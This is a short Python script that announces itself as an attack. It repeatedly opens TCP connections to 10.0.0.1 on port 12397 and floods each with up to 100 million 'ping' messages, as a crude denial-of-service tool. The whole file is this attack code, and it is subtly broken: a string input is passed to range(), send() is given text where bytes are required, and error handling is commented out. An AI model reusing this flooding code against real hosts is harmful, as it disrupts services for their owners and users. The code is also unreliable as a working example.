#!/usr/bin/python

import os, sys, socket, time, string                            #Imports

print("Start Attack")                                           #Start statement
conn = input("Number of connections to make: ")                 #User input
message = "ping"                                                #Messsage to send

def attack():
#    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    #Creating socket
    sock = socket.socket()
    host = socket.gethostname()                                 #Get local machine name
    port = 12397                                                #Reserve port number
    sock.connect(("10.0.0.1",port))				#Make connection

#    try:                                                        #Attempt Connections
    for i in range(100000000):                                   #Loop sending to host
        sock.send(message)                                      #Sending message
#   except socket.error, msg:                                   #Failed connection report err
#        print("Connection Failed")
    print("Connection Success")                                 #Connection success
    sock.close()                                                #Closing socket

for i in range(conn):                                           #Loop number connections
    attack()                                                    #Execute attack
